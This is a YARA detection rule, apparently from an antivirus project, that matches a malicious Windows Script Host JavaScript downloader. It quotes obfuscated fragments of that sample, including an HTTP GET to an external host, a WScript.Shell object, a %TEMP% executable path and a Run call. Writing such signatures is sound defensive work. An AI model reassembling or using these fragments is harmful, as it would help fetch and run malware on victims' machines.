rule sig_20160330_1c0656d1337442b9a5c3c365050f94ce {
  meta:
    description = "datamaliciousorder - file 20160330_1c0656d1337442b9a5c3c365050f94ce.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "77e65186339c4f0ce822ec910bb47368b40336b9622170f9612ce6df75cc0d89"

  strings:
    $s1  = "_OH[_W](\"GET\", \"http://bqsc.pt/c6ska\", false);" fullword ascii
    $s2  = "function _EW(_HA, _NB){_LL = _LL * 1; return _HA - _NB;};" fullword ascii
    $s3  = "var _U = function _F() {return WScript[_B0](\"WScript\"+\".Shell\");}(), _ZZ = 11;" fullword ascii
    $s4  = "if (_OH[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _H() {return _U[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"usgJrqyrIdYUr.ex\" + \"e\";};" fullword ascii
    $s6  = "function _PD(){return _CV + \"\";};" fullword ascii
    $s7  = "function _B(_TG){_U[\"Run\"](_TG, _LL, _LL);};" fullword ascii
    $s8  = "function _C() {return ((_A == true) && (_A == _XJ)) ? 1 : _LL;};" fullword ascii
    $s9  = "function _L(_C0) {var _ML = (1, 2, 3, 4, 5, _C0); return _ML;};" fullword ascii
    $s10 = "function _SX(){return 22;};" fullword ascii
    $s11 = "function _EP(){return _B0;};" fullword ascii
    $s12 = "var _Y = new this[\"Date\"]();" fullword ascii
    $s13 = "function _VC()" fullword ascii
    $s14 = " while (_OQ){" fullword ascii
    $s15 = "return _EW(_BL, _CE);" fullword ascii
    $s16 = "var _A = false;" fullword ascii
    $s17 = "var _Y0 = false;" fullword ascii
    $s18 = "_A = true; " fullword ascii
    $s19 = "_XJ = true; " fullword ascii
    $s20 = "var _XJ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}